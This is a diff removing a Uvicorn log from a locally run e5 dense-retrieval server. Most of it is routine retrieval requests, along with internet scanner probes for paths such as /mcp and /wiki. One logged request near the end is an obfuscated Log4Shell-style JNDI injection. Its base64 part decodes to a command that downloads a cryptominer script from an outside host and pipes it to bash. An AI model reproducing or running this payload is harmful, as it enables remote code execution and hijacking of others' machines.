@@ -1,604 +1,0 @@
-nohup: ignoring input
-INFO:     Started server process [2921674]
-INFO:     Waiting for application startup.
-INFO:     Application startup complete.
-INFO:     Uvicorn running on http://0.0.0.0:8000 (Press CTRL+C to quit)
-instantiate retriever with config:  {'retrieval_method': 'e5', 'retrieval_topk': 3, 'index_path': './datasets/e5_Flat.index', 'corpus_path': './datasets/wiki-18.jsonl', 'dataset_path': './data', 'data_split': 'train', 'faiss_gpu': True, 'retrieval_model_path': 'intfloat/e5-base-v2', 'retrieval_pooling_method': 'mean', 'retrieval_query_max_length': 256, 'retrieval_use_fp16': True, 'retrieval_batch_size': 512}
-[debug]----------: Using dense retriever ----------
-[debug]----------: read_index done ----------
-
-[debug]----------: Loading model from intfloat/e5-base-v2
-[debug]----------: model.device: cuda:0
-retriever loaded successfully.
-launching server...
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:05<00:00,  5.15s/it]Retrieval process: 100%|██████████| 1/1 [00:05<00:00,  5.15s/it]
-INFO:     127.0.0.1:40254 - "POST /retrieve HTTP/1.1" 200 OK
-INFO:     149.86.227.49:40664 - "GET / HTTP/1.1" 404 Not Found
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 15.11it/s]
-INFO:     127.0.0.1:50104 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  7.67it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  7.65it/s]
-INFO:     127.0.0.1:34450 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 20.37it/s]
-INFO:     127.0.0.1:59424 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  5.95it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  5.94it/s]
-INFO:     127.0.0.1:37258 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 21.10it/s]
-INFO:     127.0.0.1:43970 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 10.67it/s]
-INFO:     127.0.0.1:37366 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 19.89it/s]
-INFO:     127.0.0.1:49472 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  8.30it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  8.29it/s]
-INFO:     127.0.0.1:43846 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 20.76it/s]
-INFO:     127.0.0.1:58588 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 10.16it/s]
-INFO:     127.0.0.1:41050 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 19.15it/s]
-INFO:     127.0.0.1:39290 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  8.80it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  8.78it/s]
-INFO:     127.0.0.1:46008 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 19.72it/s]
-INFO:     127.0.0.1:43082 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  9.89it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  9.87it/s]
-INFO:     127.0.0.1:59760 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 17.56it/s]
-INFO:     127.0.0.1:53056 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  9.11it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  9.09it/s]
-INFO:     127.0.0.1:60944 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 10.83it/s]
-INFO:     127.0.0.1:59118 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  9.08it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  9.06it/s]
-INFO:     127.0.0.1:38286 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 19.79it/s]
-INFO:     127.0.0.1:50854 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  8.35it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  8.34it/s]
-INFO:     127.0.0.1:41772 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 20.41it/s]
-INFO:     127.0.0.1:49244 - "POST /retrieve HTTP/1.1" 200 OK
-INFO:     199.45.155.77:48758 - "GET / HTTP/1.1" 404 Not Found
-INFO:     199.45.155.77:44682 - "GET / HTTP/1.1" 404 Not Found
-INFO:     199.45.155.77:42266 - "PRI %2A HTTP/2.0" 404 Not Found
-WARNING:  Invalid HTTP request received.
-INFO:     199.45.155.77:42312 - "GET /favicon.ico HTTP/1.1" 404 Not Found
-WARNING:  Invalid HTTP request received.
-WARNING:  Invalid HTTP request received.
-INFO:     199.45.155.77:50304 - "GET /wiki HTTP/1.1" 404 Not Found
-INFO:     199.45.155.77:50314 - "GET /favicon.ico HTTP/1.1" 404 Not Found
-WARNING:  Invalid HTTP request received.
-INFO:     60.13.138.225:13587 - "GET / HTTP/1.1" 404 Not Found
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 10.17it/s]
-INFO:     127.0.0.1:50050 - "POST /retrieve HTTP/1.1" 200 OK
-WARNING:  Invalid HTTP request received.
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 15.12it/s]
-INFO:     127.0.0.1:41896 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 10.16it/s]
-INFO:     127.0.0.1:36950 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 20.35it/s]
-INFO:     127.0.0.1:39198 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  7.81it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  7.79it/s]
-INFO:     127.0.0.1:38418 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 14.40it/s]
-INFO:     127.0.0.1:33838 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  5.14it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  5.14it/s]
-INFO:     127.0.0.1:51564 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 11.07it/s]
-INFO:     127.0.0.1:41512 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  2.54it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  2.54it/s]
-INFO:     127.0.0.1:44078 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 12.02it/s]
-INFO:     127.0.0.1:33240 - "POST /retrieve HTTP/1.1" 200 OK
-INFO:     149.86.227.49:42456 - "GET / HTTP/1.1" 404 Not Found
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  5.90it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  5.90it/s]
-INFO:     127.0.0.1:38486 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  2.88it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  2.88it/s]
-INFO:     127.0.0.1:34362 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  5.57it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  5.56it/s]
-INFO:     127.0.0.1:53010 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  9.29it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  8.90it/s]
-INFO:     127.0.0.1:38320 - "POST /retrieve HTTP/1.1" 200 OK
-INFO:     74.82.47.28:5247 - "GET / HTTP/1.1" 404 Not Found
-INFO:     74.82.47.32:29053 - "GET /favicon.ico HTTP/1.1" 404 Not Found
-INFO:     74.82.47.44:14965 - "GET http%3A//api.ipify.org/?format=json HTTP/1.1" 404 Not Found
-INFO:     74.82.47.24:41511 - "CONNECT www.shadowserver.org%3A443 HTTP/1.1" 404 Not Found
-INFO:     149.86.227.49:49012 - "GET / HTTP/1.1" 404 Not Found
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  4.33it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  4.33it/s]
-INFO:     127.0.0.1:36168 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 10.74it/s]
-INFO:     127.0.0.1:51874 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  2.48it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  2.48it/s]
-INFO:     127.0.0.1:41620 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 13.59it/s]
-INFO:     127.0.0.1:45644 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  5.24it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  5.23it/s]
-INFO:     127.0.0.1:43102 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 11.19it/s]
-INFO:     127.0.0.1:44066 - "POST /retrieve HTTP/1.1" 200 OK
-INFO:     149.86.227.49:57532 - "GET / HTTP/1.1" 404 Not Found
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  5.20it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  5.20it/s]
-INFO:     127.0.0.1:54888 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  7.83it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  7.81it/s]
-INFO:     127.0.0.1:56490 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  5.43it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  5.42it/s]
-INFO:     127.0.0.1:34522 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  8.77it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  8.75it/s]
-INFO:     127.0.0.1:42020 - "POST /retrieve HTTP/1.1" 200 OK
-INFO:     149.86.227.49:53756 - "GET / HTTP/1.1" 404 Not Found
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  4.42it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  4.42it/s]
-INFO:     127.0.0.1:43744 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  8.79it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  8.77it/s]
-INFO:     127.0.0.1:36254 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  5.40it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  5.39it/s]
-INFO:     127.0.0.1:52270 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 11.31it/s]
-INFO:     127.0.0.1:44724 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  5.65it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  5.64it/s]
-INFO:     127.0.0.1:53876 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 10.95it/s]
-INFO:     127.0.0.1:59236 - "POST /retrieve HTTP/1.1" 200 OK
-INFO:     124.234.78.152:25001 - "GET /status HTTP/1.1" 404 Not Found
-INFO:     149.86.227.49:39528 - "GET / HTTP/1.1" 404 Not Found
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  5.83it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  5.82it/s]
-INFO:     127.0.0.1:51574 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 12.86it/s]
-INFO:     127.0.0.1:50122 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  5.37it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  5.36it/s]
-INFO:     127.0.0.1:48626 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 11.46it/s]
-INFO:     127.0.0.1:42462 - "POST /retrieve HTTP/1.1" 200 OK
-INFO:     111.7.96.147:43820 - "GET / HTTP/1.1" 404 Not Found
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  5.28it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  5.28it/s]
-INFO:     127.0.0.1:38322 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 12.77it/s]
-INFO:     127.0.0.1:60972 - "POST /retrieve HTTP/1.1" 200 OK
-INFO:     147.185.132.189:62612 - "GET / HTTP/1.1" 404 Not Found
-INFO:     149.86.227.49:32880 - "GET / HTTP/1.1" 404 Not Found
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  4.87it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  4.86it/s]
-INFO:     127.0.0.1:54944 - "POST /retrieve HTTP/1.1" 200 OK
-INFO:     167.94.138.196:38048 - "GET / HTTP/1.1" 404 Not Found
-INFO:     167.94.138.196:53128 - "GET / HTTP/1.1" 404 Not Found
-INFO:     167.94.138.196:53144 - "PRI %2A HTTP/2.0" 404 Not Found
-WARNING:  Invalid HTTP request received.
-INFO:     167.94.138.196:57696 - "GET /favicon.ico HTTP/1.1" 404 Not Found
-WARNING:  Invalid HTTP request received.
-WARNING:  Invalid HTTP request received.
-INFO:     167.94.138.196:60732 - "GET /wiki HTTP/1.1" 404 Not Found
-INFO:     167.94.138.196:60752 - "GET /favicon.ico HTTP/1.1" 404 Not Found
-WARNING:  Invalid HTTP request received.
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  9.04it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  9.02it/s]
-INFO:     127.0.0.1:60562 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  5.63it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  5.63it/s]
-INFO:     127.0.0.1:44230 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 12.58it/s]
-INFO:     127.0.0.1:47280 - "POST /retrieve HTTP/1.1" 200 OK
-WARNING:  Invalid HTTP request received.
-INFO:     165.154.11.149:49382 - "GET / HTTP/1.1" 404 Not Found
-INFO:     165.154.11.149:49388 - "GET /favicon.ico HTTP/1.1" 404 Not Found
-INFO:     165.154.11.149:49404 - "GET /robots.txt HTTP/1.1" 404 Not Found
-INFO:     165.154.11.149:41054 - "GET /sitemap.xml HTTP/1.1" 404 Not Found
-INFO:     165.154.11.149:41058 - "GET /sse HTTP/1.1" 404 Not Found
-INFO:     165.154.11.149:41072 - "GET /mcp HTTP/1.1" 404 Not Found
-INFO:     165.154.11.149:41088 - "GET /mcp-sse HTTP/1.1" 404 Not Found
-INFO:     149.86.227.49:42384 - "GET / HTTP/1.1" 404 Not Found
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 10.02it/s]
-INFO:     127.0.0.1:36264 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 18.01it/s]
-INFO:     127.0.0.1:43240 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  8.42it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  8.40it/s]
-INFO:     127.0.0.1:37656 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 19.44it/s]
-INFO:     127.0.0.1:39692 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 10.30it/s]
-INFO:     127.0.0.1:34908 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 16.56it/s]
-INFO:     127.0.0.1:46032 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  9.92it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  9.90it/s]
-INFO:     127.0.0.1:46088 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 18.20it/s]
-INFO:     127.0.0.1:50792 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 10.46it/s]
-INFO:     127.0.0.1:57968 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 19.44it/s]
-INFO:     127.0.0.1:47954 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  8.24it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  8.22it/s]
-INFO:     127.0.0.1:44628 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 19.28it/s]
-INFO:     127.0.0.1:38592 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  6.88it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  6.87it/s]
-INFO:     127.0.0.1:52302 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 22.24it/s]
-INFO:     127.0.0.1:36650 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 10.32it/s]
-INFO:     127.0.0.1:42064 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 20.69it/s]
-INFO:     127.0.0.1:45806 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  3.90it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  3.90it/s]
-INFO:     127.0.0.1:35900 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 20.36it/s]
-INFO:     127.0.0.1:54264 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 10.58it/s]
-INFO:     127.0.0.1:46370 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 21.33it/s]
-INFO:     127.0.0.1:50284 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  3.94it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  3.93it/s]
-INFO:     127.0.0.1:50668 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 19.90it/s]
-INFO:     127.0.0.1:36118 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 11.06it/s]
-INFO:     127.0.0.1:50258 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 18.09it/s]
-INFO:     127.0.0.1:49552 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  9.28it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  9.26it/s]
-INFO:     127.0.0.1:48316 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 10.97it/s]
-INFO:     127.0.0.1:40214 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  3.91it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  3.90it/s]
-INFO:     127.0.0.1:52484 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 20.40it/s]
-INFO:     127.0.0.1:36088 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  8.64it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  8.62it/s]
-INFO:     127.0.0.1:48100 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 21.00it/s]
-INFO:     127.0.0.1:40656 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 10.79it/s]
-INFO:     127.0.0.1:59130 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  7.80it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  7.78it/s]
-INFO:     127.0.0.1:55010 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 10.67it/s]
-INFO:     127.0.0.1:56110 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 22.34it/s]
-INFO:     127.0.0.1:48882 - "POST /retrieve HTTP/1.1" 200 OK
-INFO:     185.91.127.20:50268 - "GET /t%28%27%24%7B%24%7Benv%3ANaN%3A-j%7Dndi%24%7Benv%3ANaN%3A-%3A%7D%24%7Benv%3ANaN%3A-l%7Ddap%24%7Benv%3ANaN%3A-%3A%7D//31.15.17.128%3A3306/TomcatBypass/Command/Base64/ZXhwb3J0IEhPTUU9L3RtcDsgY3VybCAtcyAtTCBodHRwOi8vNDYuOC43OC4xNjMvc2NyaXB0cy80dGhlcG9vbF9taW5lci5zaCB8IGJhc2ggLXM7IHdnZXQgLXFPLSBodHRwOi8vNDYuOC43OC4xNjMvc2NyaXB0cy80dGhlcG9vbF9taW5lci5zaCB8IGJhc2ggLXM%3D%7D%27%29 HTTP/1.1" 404 Not Found
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  7.84it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  7.83it/s]
-INFO:     127.0.0.1:35378 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 15.10it/s]
-INFO:     127.0.0.1:48020 - "POST /retrieve HTTP/1.1" 200 OK
